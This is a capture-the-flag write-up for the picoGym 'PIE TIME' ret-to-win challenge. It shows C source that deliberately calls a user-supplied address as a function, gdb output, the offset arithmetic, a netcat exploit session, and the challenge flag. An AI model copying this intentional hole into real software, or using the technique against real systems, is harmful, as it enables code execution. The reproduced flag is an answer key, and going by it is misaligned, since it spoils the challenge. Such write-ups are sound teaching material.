# CTF Writeup - picoGym

## Challenge: PIE TIME

#### Category: Binary Exploitation 

#### Writeup Author: iamgreedy

### Challenge Description
It is a ret-to-win challenge. The PIE binary prints the address of main function and asks for the another address to jump.
Given files: `vuln.c` and binary `vuln`. 

### Given vuln.c:
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

## Solution
Since it is a PIE (Position Independent Executable) so we have to use relative address of the win function with respect to the main address that we are given.

You can use any decompiler or use gdb to get the addresses 
```bash
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x00000000000010e0  __cxa_finalize@plt
0x00000000000010f0  putchar@plt
0x0000000000001100  puts@plt
0x0000000000001110  fclose@plt
0x0000000000001120  __stack_chk_fail@plt
0x0000000000001130  printf@plt
0x0000000000001140  fgetc@plt
0x0000000000001150  signal@plt
0x0000000000001160  setvbuf@plt
0x0000000000001170  fopen@plt
0x0000000000001180  __isoc99_scanf@plt
0x0000000000001190  exit@plt
0x00000000000011a0  _start
0x00000000000011d0  deregister_tm_clones
0x0000000000001200  register_tm_clones
0x0000000000001240  __do_global_dtors_aux
0x0000000000001280  frame_dummy
0x0000000000001289  segfault_handler
0x00000000000012a7  win     #0x12a7
0x000000000000133d  main    #0x133d
0x0000000000001410  __libc_csu_init
0x0000000000001480  __libc_csu_fini
0x0000000000001488  _fini
```
Relative address of win w.r.t. main = 0x12a7 - 0x133d = -0x96 (-150)
i.e address of win = address of main - 0x96

```bash
$ nc rescued-float.picoctf.net XXXXX
Address of main: 0x631eea45e33d
Enter the address to jump to, ex => 0x12345: 0x631eea45e2a7 #main - 0x96
Your input: 631eea45e2a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_ecb96bdd}
```

### Extracted Flag

```
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_ecb96bdd}
```




